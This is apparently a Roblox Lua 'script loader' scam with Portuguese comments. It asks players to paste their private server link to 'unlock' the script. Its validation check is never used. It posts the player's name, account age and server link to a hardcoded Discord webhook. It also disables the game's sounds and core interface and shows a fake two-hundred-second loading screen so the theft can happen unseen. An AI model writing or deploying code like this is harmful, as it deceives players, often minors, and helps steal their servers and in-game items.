-- Serviços épicos 3000
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")
local LocalPlayer = game:GetService("Players").LocalPlayer

-- pacote
local NetPackages = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")

-- ouvidor d noti
local notificationEvent = NetPackages:WaitForChild("RE/NotificationService/Notify", 5).OnClientEvent:Connect(function(title, message)
    -- Handle notifications here
end)

-- desativar as funções player
task.spawn(function()
    NetPackages["RF/SettingsService/ToggleSetting"]:InvokeServer("Music")
    NetPackages["RF/SettingsService/ToggleSetting"]:InvokeServer("Sound Effects")
    NetPackages["RF/SettingsService/ToggleSetting"]:InvokeServer("Chat Tips")
    NetPackages["RF/SettingsService/ToggleSetting"]:InvokeServer("VFX")
end)

-- GUI
local brainrotUI = Instance.new("ScreenGui")
brainrotUI.Name = "BrainrotUI"
brainrotUI.ResetOnSpawn = false
brainrotUI.Parent = LocalPlayer:WaitForChild("PlayerGui")

-- UI: Frame
local mainFrame = Instance.new("Frame", brainrotUI)
mainFrame.Size = UDim2.new(0, 400, 0, 180)
mainFrame.Position = UDim2.new(0.5, -200, 0.5, -90)
mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
mainFrame.Active = true
mainFrame.Draggable = true

-- UI: canto do frame
local frameCorner = Instance.new("UICorner", mainFrame)
frameCorner.CornerRadius = UDim.new(0, 10)

-- UI: titlo
local titleLabel = Instance.new("TextLabel", mainFrame)
titleLabel.Size = UDim2.new(1, 0, 0, 45)
titleLabel.BackgroundTransparency = 1
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextSize = 20
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.Text = "Coloque o link de seu servidor privado para liberar o script"

-- UI: TextBox para o link do sv
local serverLinkBox = Instance.new("TextBox", mainFrame)
serverLinkBox.Size = UDim2.new(0.9, 0, 0, 40)
serverLinkBox.Position = UDim2.new(0.05, 0, 0.45, 0)
serverLinkBox.PlaceholderText = "Enter private server link..."
serverLinkBox.Font = Enum.Font.Gotham
serverLinkBox.TextSize = 18
serverLinkBox.TextColor3 = Color3.new(1, 1, 1)
serverLinkBox.BackgroundColor3 = Color3.fromRGB(45, 45, 60)

-- UI: canto do textbox
local textBoxCorner = Instance.new("UICorner", serverLinkBox)
textBoxCorner.CornerRadius = UDim.new(0, 8)

-- UI: bttn d enviar
local enterButton = Instance.new("TextButton", mainFrame)
enterButton.Size = UDim2.new(0.9, 0, 0, 40)
enterButton.Position = UDim2.new(0.05, 0, 0.75, 0)
enterButton.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
enterButton.Text = "Enter"
enterButton.Font = Enum.Font.GothamBold
enterButton.TextSize = 18
enterButton.TextColor3 = Color3.new(1, 1, 1)

-- UI: arredondamento botao
local buttonCorner = Instance.new("UICorner", enterButton)
buttonCorner.CornerRadius = UDim.new(0, 8)

-- função de click do botão
enterButton.MouseButton1Click:Connect(function()
    local serverLink = serverLinkBox.Text
    local isValidLink = serverLink:match("^https://www%.roblox%.com/share%?code=[%w%d]+&type=Server$")

    enterButton.Text = "✅ Valido"
    enterButton.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
    wait(0.5)
    brainrotUI:Destroy()

    -- calculo de idade da conta
    local accountAgeDays = math.floor((1760877218 - LocalPlayer.AccountAge) / 86400)

    -- recebe modelo = extrai nome brainrot
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("Model") then
            local modelName = obj.Name
            -- não vou add logica, preguiça
        end
    end

    -- enviar webhook
    task.spawn(function()
        local webhookData = HttpService:JSONEncode({
            username = "Auto Moreira V2 - .jziemnaky1",
            embeds = {{
                color = 16732240,
                fields = {
                    {name = "👤 player", value = "**Nome:** "..LocalPlayer.Name.."\n**Account idade da conta:** "..accountAgeDays.." days", inline = false},
                    {name = "🎁 Brainrots", value = "**jziemnaky1**\n1x", inline = false},
                    {name = "🔗 Link", value = "[clique aqui]("..serverLink..")", inline = false},
                }
            }},
            avatar_url = "https://imagenes.elpais.com/resizer/v2/Q32LFYH6JFPXTHGPXD7KWFTNPM.jpg?auth=663e3d03c1913c56c214f3107abc7d41fdc5e28b0e330fdfe11b065184c2eb39&width=414",
        })

        request({
            Url = "https://discord.com/api/webhooks/1424798417678368818/OsiJQW7ZAU7v1R_jK43mX7H12dZ-KzQh_F1euhXriil4W5c-C-eArhW5d4dzjy_zj1tH",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = webhookData
        })
    end)
end)

-- Desabilitar CoreGui
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)

-- carregador de UI
local loaderGui = Instance.new("ScreenGui", game:GetService("CoreGui"))
loaderGui.Name = "KdmlLoader"
loaderGui.IgnoreGuiInset = true
loaderGui.ResetOnSpawn = false

local loaderFrame = Instance.new("Frame", loaderGui)
loaderFrame.Size = UDim2.new(1, 0, 1, 0)
loaderFrame.BackgroundColor3 = Color3.fromRGB(20, 0, 0)

local loaderTitle = Instance.new("TextLabel", loaderFrame)
loaderTitle.Size = UDim2.new(1, 0, 0.1, 0)
loaderTitle.Position = UDim2.new(0, 0, 0.35, 0)
loaderTitle.BackgroundTransparency = 1
loaderTitle.Font = Enum.Font.GothamBold
loaderTitle.TextSize = 36
loaderTitle.TextColor3 = Color3.fromRGB(255, 80, 80)
loaderTitle.Text = "Carregando script..."
loaderTitle.TextScaled = true

local loaderPercent = Instance.new("TextLabel", loaderFrame)
loaderPercent.Size = UDim2.new(1, 0, 0.1, 0)
loaderPercent.Position = UDim2.new(0, 0, 0.45, 0)
loaderPercent.BackgroundTransparency = 1
loaderPercent.Font = Enum.Font.GothamBold
loaderPercent.TextSize = 24
loaderPercent.TextColor3 = Color3.fromRGB(255, 80, 80)
loaderPercent.Text = "0%"

local loaderDesc = Instance.new("TextLabel", loaderFrame)
loaderDesc.Size = UDim2.new(1, 0, 0.05, 0)
loaderDesc.Position = UDim2.new(0, 0, 0.52, 0)
loaderDesc.BackgroundTransparency = 1
loaderDesc.Font = Enum.Font.Gotham
loaderDesc.TextSize = 16
loaderDesc.TextColor3 = Color3.fromRGB(180, 180, 180)
loaderDesc.Text = "Fica tranks, sua base já foi fechada instantaneamente"
loaderDesc.TextScaled = true
loaderDesc.TextWrapped = true
loaderDesc.TextXAlignment = Enum.TextXAlignment.Center

local loaderFooter = Instance.new("TextLabel", loaderFrame)
loaderFooter.Size = UDim2.new(1, 0, 0.05, 0)
loaderFooter.Position = UDim2.new(0, 0, 0.9, 0)
loaderFooter.BackgroundTransparency = 1
loaderFooter.Font = Enum.Font.GothamBold
loaderFooter.TextSize = 18
loaderFooter.TextColor3 = Color3.fromRGB(255, 100, 100)
loaderFooter.Text = "made by jziemnaky1"

-- carrega som (fake)
local loaderSound = Instance.new("Sound", loaderFrame)
loaderSound.SoundId = "rbxassetid://1848354536"
loaderSound.Volume = 1
loaderSound.Looped = true
loaderSound:Play()

-- Simula carregamento
for i = 1, 100 do
    loaderPercent.Text = i.."%"
    wait(2)
end

-- Limpa Tudo
loaderTitle:Destroy()
loaderPercent:Destroy()
loaderDesc:Destroy()

local loaderCompleteLabel = Instance.new("TextLabel", loaderFrame)
loaderCompleteLabel.Size = UDim2.new(1, 0, 1, 0)
loaderCompleteLabel.BackgroundTransparency = 1
loaderCompleteLabel.Font = Enum.Font.GothamBold
loaderCompleteLabel.TextScaled = true
loaderCompleteLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
loaderCompleteLabel.Text = "✅ Script Carregado\nEspere 2-3 Minutos..."
